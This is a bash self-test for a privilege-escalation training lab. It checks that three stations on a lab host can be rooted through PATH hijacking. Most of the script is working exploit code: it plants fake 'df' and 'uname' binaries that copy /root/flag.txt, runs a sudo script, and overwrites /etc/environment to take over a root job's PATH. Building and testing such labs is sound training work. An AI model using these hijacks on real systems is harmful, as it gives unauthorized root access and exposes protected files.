#!/usr/bin/env bash
# Road to Root — PATH lab self-test. Stations C, D, and E on target-path.
# A and B live on the SUID and cron hosts and are covered by those tests.
# Run as labuser1 inside the container. Exit 0 means all three reached root.
set -u
FLAG='R2R{'
P=/tmp/rtr_proof

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without root"
  exit 1
else
  echo "  [PASS] control — flag is root-only"
fi

rm -f ${P}_c ${P}_d ${P}_e \
  /opt/admin/bin/df /opt/svc/bin/df /home/labuser1/bin/uname 2>/dev/null || true
mkdir -p /home/labuser1/bin

echo "== arming C, D, E =="

# C — sudo script calls df after putting a writable dir first on PATH.
cat > /opt/admin/bin/df << EOF
#!/bin/sh
cp /root/flag.txt ${P}_c
chmod 644 ${P}_c
EOF
chmod +x /opt/admin/bin/df
sudo /opt/admin/disk-check.sh >/dev/null 2>&1 || true
echo "  armed C  -> /opt/admin/bin/df then sudo disk-check.sh"

# D — unit PATH lists /opt/svc/bin first. The runner calls df within ~20s.
cat > /opt/svc/bin/df << EOF
#!/bin/sh
cp /root/flag.txt ${P}_d
chmod 644 ${P}_d
EOF
chmod +x /opt/svc/bin/df
echo "  armed D  -> /opt/svc/bin/df, waiting for the unit runner"

# E — /etc/environment is writable. The root job sources it, then runs uname.
cat > /home/labuser1/bin/uname << EOF
#!/bin/sh
cp /root/flag.txt ${P}_e
chmod 644 ${P}_e
EOF
chmod +x /home/labuser1/bin/uname
printf 'PATH="/home/labuser1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n' \
  > /etc/environment
echo "  armed E  -> PATH in /etc/environment, waiting for the login-style job"

echo "== waiting up to 45s for D and E =="
for _ in 1 2 3 4 5 6 7 8 9; do
  if [ -f ${P}_d ] && [ -f ${P}_e ]; then
    break
  fi
  sleep 5
done

echo "== results =="
PASS=0; FAIL=0
labels_c="C  sudo wrapper PATH"
labels_d="D  service PATH"
labels_e="E  /etc/environment PATH"
for x in c d e; do
  eval "label=\$labels_$x"
  if [ -f "${P}_$x" ] && grep -q "$FLAG" "${P}_$x" 2>/dev/null; then
    echo "  [PASS] $label"; PASS=$((PASS + 1))
  else
    echo "  [FAIL] $label  (expected ${P}_$x to contain $FLAG)"; FAIL=$((FAIL + 1))
  fi
done

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 3 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL PATH STATIONS ON THIS HOST REACH ROOT -- OK"
  exit 0
else
  echo "  SOME PATHS FAILED"
  exit 1
fi
